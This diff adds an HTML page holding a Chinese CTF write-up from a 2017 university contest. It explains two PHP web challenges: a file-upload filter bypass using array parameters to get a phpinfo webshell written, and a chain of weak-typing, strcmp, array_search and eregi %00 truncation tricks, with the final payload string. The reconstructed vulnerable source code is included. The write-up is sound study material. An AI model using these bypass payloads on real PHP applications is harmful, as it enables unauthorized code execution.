@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="2017高校运维线上赛"/>
+  <meta name="twitter:description" content="日常划水。。。。。
+
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>2017高校运维线上赛 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="https://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://yang1k.github.io/post'>Archive</a>
+	<a href='https://yang1k.github.io/tags'>Tags</a>
+	<a href='https://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="https://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        2017高校运维线上赛
+                    </h1>
+                    <h2 class="headline">
+                    Nov 6, 2017 10:54
+                    · 273 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#eis文件上传的题">EIS文件上传的题</a>
+<ul>
+<li><a href="#总结">总结</a></li>
+<li><a href="#内容">内容</a></li>
+<li><a href="#思路">思路</a></li>
+<li><a href="#原理">原理</a></li>
+<li><a href="#复现的代码">复现的代码</a>
+<ul>
+<li><a href="#要求">要求：</a></li>
+</ul></li>
+<li><a href="#修复">修复</a></li>
+</ul></li>
+<li><a href="#eis-php是最好的语言">EIS PHP是最好的语言</a>
+<ul>
+<li><a href="#总结-1">总结</a></li>
+<li><a href="#第一个过滤的绕过">第一个过滤的绕过</a></li>
+<li><a href="#第二个过滤的绕过">第二个过滤的绕过</a></li>
+<li><a href="#第三个过滤的绕过">第三个过滤的绕过</a></li>
+<li><a href="#get和-post获取数组的方法">$_GET和$_POST获取数组的方法</a></li>
+<li><a href="#最终">最终</a></li>
+<li><a href="#源码">源码</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>日常划水。。。。。</p>
+
+<!-- more -->
+
+<h2 id="eis文件上传的题">EIS文件上传的题</h2>
+
+<h3 id="总结">总结</h3>
+
+<p>许多处理字符串的函数如果函数接收到的参数是数组的话，会返回NULL。例如strcmp,strlen,md5等，但是preg_match和preg_match_all函数的参数如果是数组的话则返回false，这样就可以绕过正则的过滤。</p>
+
+<h3 id="内容">内容</h3>
+
+<p>题目是一个form表单，需要提交两个内容，一个是文件后缀名，一个是文件内容。</p>
+
+<h3 id="思路">思路</h3>
+
+<p>看了writeup后，发现是过滤&rsquo;&lt;&lsquo;符号。然后要使用数组的方法绕过过滤。</p>
+
+<p>知道传过去的是ext和content参数。于是构造的payload是 content[]=&lt;?php phpinfo();?&gt;&amp;ext=php，然后访问这个文件，访问成功即绕过</p>
+
+<h3 id="原理">原理</h3>
+
+<p>根据题目是要人输入内容然后生成文件，可以知道后台是将用户提交的数据写入文件，然后完成上传文件这一功能。</p>
+
+<p>1.所以后台一定是使用了写入文件的函数。</p>
+
+<p>写入的函数：file_put_contents，该函数的第二个参数是date参数，下边是date参数的官方解释</p>
+
+<pre><code>data
+要写入的数据。类型可以是 string，array 或者是 stream 资源（如上面所说的那样）。
+
+如果 data 指定为 stream 资源，这里 stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。
+
+参数 data 可以是数组（但不能为多维数组），这就相当于 file_put_contents($filename, join('', $array))。
+</code></pre>
+
+<p>由文档可知该函数允许写入数组类型。</p>
+
+<p>2.来分析过滤提交的字符串的函数preg_match，猜想该题的的过滤方法是</p>
+
+<pre><code>if(preg_match('/\&lt;/',$data)){
+die('hack');
+}
+</code></pre>
+
+<p>我们知道，很多处理字符串的函数如果传入数组会出错返回NULL, 如strcmp,strlen,md5等，　但preg_match 函数出错返回false, 这里我们可以通过var_dump(preg_match(&lsquo;/&lt;/&lsquo;,$data)); 来验证，　这样的话，preg_match 的正则过滤就失效了</p>
+
+<p>因此猜测文件上传的代码是这样的</p>
+
+<pre><code>    
+&lt;?php 
+
+if(isset($_POST['content']) &amp;&amp; isset($_POST['ext'])){
+    $data = $_POST['content'];
+    $ext = $_POST['ext'];
+ 
+    //var_dump(preg_match('/\&lt;/',$data));
+    if(preg_match('/\&lt;/',$data)){
+        die('hack');
+    }
+    $filename = time();
+    file_put_contents($filename.$ext, $data);
+}
+ 
+?&gt;
+
+</code></pre>
+
+<p>所以就可以使用content[]=&lt;?php phpinfo();?&gt;&amp;ext=php来绕过。</p>
+
+<h3 id="复现的代码">复现的代码</h3>
+
+<h4 id="要求">要求：</h4>
+
+<p>上传php文件，代码内容为&lt;?php phpinfo();?&gt;。</p>
+
+<pre><code>&lt;?php 
+ 
+if(isset($_POST['content']) &amp;&amp; isset($_POST['ext'])){
+    $data = $_POST['content'];
+    $ext = $_POST['ext'];
+ 
+    //var_dump(preg_match('/\&lt;/',$data));
+    if(preg_match('/\&lt;/',$data)){
+        die('hack');
+    }
+    echo 1;
+   // $filename = time();
+   // file_put_contents($filename.$ext, $data);
+}
+ 
+?&gt;
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+	&lt;meta charset=&quot;utf-8&quot;&gt;
+	&lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;45.php&quot; method=&quot;post&quot;&gt;
+	文件后缀：&lt;input type=&quot;text&quot; name=&quot;ext&quot;&gt;
+	&lt;br&gt;
+	文件内容：&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;
+	&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
+
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h3 id="修复">修复</h3>
+
+<p>修复方法是使用fwrite 函数来代替危险的file_put_contents函数,fwrite函数只能传入字符串，如果是数组会出错返回false</p>
+
+<h2 id="eis-php是最好的语言">EIS PHP是最好的语言</h2>
+
+<h3 id="总结-1">总结</h3>
+
+<p>利用php弱类型比较，用一个数组和数字比较，数组转换后大于2017，目前发现最大的字符串是9e9，大于9999999。</p>
+
+<p>php中 0==任何字符串（===不行）绕过array_search（）函数</p>
+
+<p>strcmp函数弱类型比较，比较一个字符串和和一个数组时返回NULL</p>
+
+<p>利用到eregi函数的%00截断。</p>
+
+<h3 id="第一个过滤的绕过">第一个过滤的绕过</h3>
+
+<pre><code>if(is_array($a)){
+    is_numeric(@$a[&quot;param1&quot;])?exit:NULL;
+    if(@$a[&quot;param1&quot;]){
+        ($a[&quot;param1&quot;]&gt;2017)?$v1=1:NULL;
+    } 
+</code></pre>
+
+<p>需要满足的条件</p>
+
+<ul>
+<li>$a需要是数组</li>
+<li>$a[&ldquo;param1&rdquo;]该元素不能是数字</li>
+<li>$a[&ldquo;param1&rdquo;]需要大于2017</li>
+</ul>
+
+<p>综上,数组满足要求</p>
+
+<p>$a=array(&ldquo;param1&rdquo;=&gt;array(0));</p>
+
+<h3 id="第二个过滤的绕过">第二个过滤的绕过</h3>
+
+<pre><code>    if(is_array(@$a[&quot;param2&quot;])){
+        if(count($a[&quot;param2&quot;])!==5 OR !is_array($a[&quot;param2&quot;][0])) exit;
+        $pos = array_search(&quot;nudt&quot;, $a[&quot;param2&quot;]);
+        $pos===false?die(&quot;nope&quot;):NULL;
+        foreach($a[&quot;param2&quot;] as $key=&gt;$val){
+            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;
+        }
+        $v2=1;
+    }
+</code></pre>
+
+<p>需要满足的条件</p>
+
+<ul>
+<li>$a[&ldquo;param2&rdquo;]是一个数组</li>
+<li>count($a[&ldquo;param2&rdquo;])等于5并且$a[&ldquo;param2&rdquo;][0]是一个数组</li>
+<li>在数组$a[&ldquo;param2&rdquo;]中找不到nudt</li>
+<li>在数组$a[&ldquo;param2&rdquo;]中找到nudt</li>
+</ul>
+
+<p>array_search是一个弱类型匹配，所以可以利用0来绕过，0==任何字符串(php弱类型比较中有解释)。</p>
+
+<p>最终的内容</p>
+
+<p>$a=array(&ldquo;param2&rdquo;=&gt;array(array(),0,1,1,1));</p>
+
+<h3 id="第三个过滤的绕过">第三个过滤的绕过</h3>
+
+<pre><code>$c=@$_GET['egg'];
+$d=@$_GET['fish'];
+if(@$c[1]){
+    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){
+        eregi(&quot;M|n|s&quot;,$d.$c[0])?err():NULL; 
+        strpos(($c[0].$d), &quot;MyAns&quot;)?$v3=1:NULL;
+    }
+}
+</code></pre>
+
+<p>strcmp（）函数解析</p>
+
+<pre><code>strcmp — 二进制安全字符串比较 
+如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
+是一个弱类型比较，若果其中一个参数是数组，则返回NULL
+</code></pre>
+
+<p>eregi函数存在%00截断，在%00截断有详细解释</p>
+
+<p>第三步则是需要在$c[0].$d中找到MyAns。</p>
+
+<p>最终结果</p>
+
+<p>egg[0]=%00MyAns&amp;egg[1]=%00MyAns&amp;fish[]=1</p>
+
+<h3 id="get和-post获取数组的方法">$_GET和$_POST获取数组的方法</h3>
+
+<p>示例</p>
+
+<pre><code>?id[0]=1
+</code></pre>
+
+<p>这样传到后台的就是一个第0个元素是1的数组</p>
+
+<h3 id="最终">最终</h3>
+
+<p>进行序列化操作，将这三个整合后得到</p>
+
+<pre><code>foo=a:2:{s:6:%
+22param1%22;a:1:{i:0;i:1;}s:6:%22param2%22;a:5:{i:0;a:1:{i:0;i:0;}i:1;i:0;i:2;i:2;i:
+3;i:3;i:4;i:4;}}&amp;egg[0]=%00MyAns&amp;egg[1]=%00MyAns&amp;fish[]=1
+</code></pre>
+
+<h3 id="源码">源码</h3>
+
+<pre><code>&lt;?php
+$v1=0;$v2=0;$v3=0;
+$a=(array)unserialize(@$_GET['foo']);
+//第一个参数的过滤
+if(is_array($a)){
+    is_numeric(@$a[&quot;param1&quot;])?exit:NULL;
+    if(@$a[&quot;param1&quot;]){
+        ($a[&quot;param1&quot;]&gt;2017)?$v1=1:NULL;
+    }  
+//第二个参数的过滤
+    if(is_array(@$a[&quot;param2&quot;])){
+        if(count($a[&quot;param2&quot;])!==5 OR !is_array($a[&quot;param2&quot;][0])) exit;
+        $pos = array_search(&quot;nudt&quot;, $a[&quot;param2&quot;]);
+        $pos===false?die(&quot;nope&quot;):NULL;
+        foreach($a[&quot;param2&quot;] as $key=&gt;$val){
+            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;
+        }
+        $v2=1;
+    }
+}
+//第三个参数的过滤
+$c=@$_GET['egg'];
+$d=@$_GET['fish'];
+if(@$c[1]){
+    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){
+        eregi(&quot;M|n|s&quot;,$d.$c[0])?err():NULL; 
+        strpos(($c[0].$d), &quot;MyAns&quot;)?$v3=1:NULL;
+    }
+}
+if($v1 &amp;&amp; $v2 &amp;&amp; $v3){
+    include &quot;flag.php&quot;;
+    echo $flag;
+}
+
+?&gt;
+</code></pre>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fyang1k.github.io%2ftypecho%2fpost%2f2017%25E9%25AB%2598%25E6%25A0%25A1%25E8%25BF%2590%25E7%25BB%25B4%2f - 2017%e9%ab%98%e6%a0%a1%e8%bf%90%e7%bb%b4%e7%ba%bf%e4%b8%8a%e8%b5%9b "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="https://yang1k.github.io/js/main.js"></script>
+<script src="https://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
